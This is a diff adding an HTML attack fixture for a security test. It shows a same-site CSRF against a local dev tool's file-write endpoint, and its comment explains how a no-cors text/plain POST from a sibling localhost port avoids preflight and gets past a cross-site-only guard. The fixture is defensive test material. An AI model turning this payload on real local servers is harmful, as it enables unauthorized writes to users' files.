@@ -1,0 +1,26 @@
+<!doctype html>
+<!--
+  Attack fixture — same-site CSRF against a Trusted bulb's filesystem.
+  This is a stripped page standing in for ANY sibling localhost origin (another
+  bulb, the user's own vite dev server with a compromised dep, any localhost tool).
+  It does one thing: a no-cors, text/plain POST to the victim's /__fs/write.
+  - no-cors + text/plain is a CORS-safelisted request, so the browser sends it with
+    NO preflight; the opaque response is unreadable but the write side-effect lands.
+  - Different port on the same host ⇒ the browser stamps Sec-Fetch-Site: same-site,
+    which the current guard accepts (it only blocks cross-site).
+  The harness rewrites the placeholder token below with the victim's http://localhost:<port>.
+-->
+<html>
+  <body>
+    <script>
+      fetch('__VICTIM_ORIGIN__/__fs/write?path=pwned.txt', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain' },
+        body: 'written by a sibling localhost origin via same-site CSRF',
+      })
+        .then(() => { document.title = 'sent' })
+        .catch(() => { document.title = 'error' })
+    </script>
+  </body>
+</html>
